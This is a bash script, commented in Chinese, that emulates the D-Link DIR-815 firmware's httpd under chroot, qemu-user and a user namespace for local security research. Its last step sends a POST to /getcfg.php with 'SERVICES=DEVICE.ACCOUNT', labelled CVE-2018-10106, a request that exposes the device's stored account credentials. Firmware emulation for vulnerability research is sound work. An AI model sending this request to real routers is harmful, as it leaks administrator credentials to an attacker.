#!/usr/bin/env bash
# run-chroot.sh —— 不用内核、不用 Docker,直接 chroot + qemu-user 跑固件 httpd
#
# 和全系统仿真(boot-full.sh)的区别:
#   * 启动 ~5 秒(vs ~16 秒),不加载内核
#   * 需要 user namespace 造"假 root"(因为 httpd 的 SO_BINDTODEVICE 要 CAP_NET_RAW)
#   * 只能跑用户态服务,没有 init 序列、没有内核模块
#
# 用法:
#   ROOTFS=~/work/dir815/squashfs-root ./tools/run-chroot.sh
#
# 它会:起 xmldb -> 灌 runtime 节点 -> 生成 httpd.conf -> 起 httpd
#       最后在同一个 netns 里 curl 127.0.0.1:8081
set -euo pipefail

ROOTFS="${ROOTFS:-./squashfs-root}"
QBIN="${QBIN:-$HOME/work/qemu/usr/bin/qemu-mipsel-static}"
PORT="${PORT:-8081}"

die() { printf '\033[1;31m[x]\033[0m %s\n' "$*" >&2; exit 1; }

ROOTFS="$(cd "$ROOTFS" && pwd)"
[ -d "$ROOTFS" ] || die "rootfs 不存在"
[ -x "$QBIN" ]   || die "找不到 qemu-mipsel-static: $QBIN(见 tools/run-local.sh)"
[ -f "$ROOTFS/etc/config/image_sign" ] || die "rootfs 不完整"

SIGN="$(tr -d '\r\n' < "$ROOTFS/etc/config/image_sign")"

# 静态 qemu 放进 rootfs,chroot 后直接可用
mkdir -p "$ROOTFS/qemu" "$ROOTFS/dev" "$ROOTFS/proc" "$ROOTFS/var/run" "$ROOTFS/tmp"
cp -f "$QBIN" "$ROOTFS/qemu/qemu-mipsel-static"
chmod +x "$ROOTFS/qemu/qemu-mipsel-static"
rm -f "$ROOTFS/var/run/xmldb_sock" "$ROOTFS/var/run/httpd.pid"

cat > /tmp/.run-chroot-inner.sh <<'INNER'
#!/bin/bash
set -u
R="$1"; SIGN="$2"; PORT="$3"

mkdir -p "$R/dev" "$R/proc" "$R/var/run"
# mknod 在 user namespace 里会被拒,改绑单个设备文件
for d in null zero urandom random; do [ -e "$R/dev/$d" ] || touch "$R/dev/$d"; done
mount --bind /dev/null    "$R/dev/null"    2>/dev/null || true
mount --bind /dev/zero    "$R/dev/zero"    2>/dev/null || true
mount --bind /dev/urandom "$R/dev/urandom" 2>/dev/null || true
mount -t proc proc "$R/proc" 2>/dev/null || true
ip link set lo up 2>/dev/null

CH() { chroot "$R" /qemu/qemu-mipsel-static -L / "$@"; }

CH /usr/sbin/xmldb -n "$SIGN" >/tmp/xmldb-chroot.log 2>&1 &
sleep 3
[ -S "$R/var/run/xmldb_sock" ] || { echo "[x] xmldb socket 没起来"; cat /tmp/xmldb-chroot.log; exit 1; }

for kv in "/runtime/device/modelname DIR-815" \
          "/runtime/device/firmwareversion 2.02b01" \
          "/runtime/services/http/server:1/mode HTTP" \
          "/runtime/services/http/server:1/inf LAN-1" \
          "/runtime/services/http/server:1/ifname lo" \
          "/runtime/services/http/server:1/af inet" \
          "/runtime/services/http/server:1/ipaddr 127.0.0.1" \
          "/runtime/services/http/server:1/port $PORT" \
          "/runtime/services/http/server:1/hnap 1" \
          "/runtime/services/http/server:1/widget 0"; do
    set -- $kv
    CH /usr/sbin/xmldbc -s "$1" "$2" >/dev/null 2>&1
done
CH /usr/sbin/xmldbc -P /etc/services/HTTP/httpcfg.php > "$R/var/run/httpd.conf" 2>/dev/null

CH /sbin/httpd -f /var/run/httpd.conf >/tmp/httpd-chroot.log 2>&1 &
sleep 3

echo "[*] 监听情况:"
ss -tln | grep "$PORT" || echo "    (未监听)"
echo
echo "[*] curl /index.html:"
curl -s -m 6 -i "http://127.0.0.1:$PORT/index.html" | head -6
echo
echo "[*] curl /DevInfo.php(PHP 链路):"
curl -s -m 8 -o /dev/null -w "    DevInfo.php -> %{http_code}\n" "http://127.0.0.1:$PORT/DevInfo.php"
echo
echo "[*] POST /getcfg.php(CVE-2018-10106):"
curl -s -m 8 -i -X POST "http://127.0.0.1:$PORT/getcfg.php" \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     --data 'SERVICES=DEVICE.ACCOUNT' | head -20

pkill -9 -f qemu-mipsel >/dev/null 2>&1 || true
INNER
chmod +x /tmp/.run-chroot-inner.sh

echo "[*] 在 user namespace 里执行(user+mount+net+pid)"
exec unshare -rmnp --fork /tmp/.run-chroot-inner.sh "$ROOTFS" "$SIGN" "$PORT"
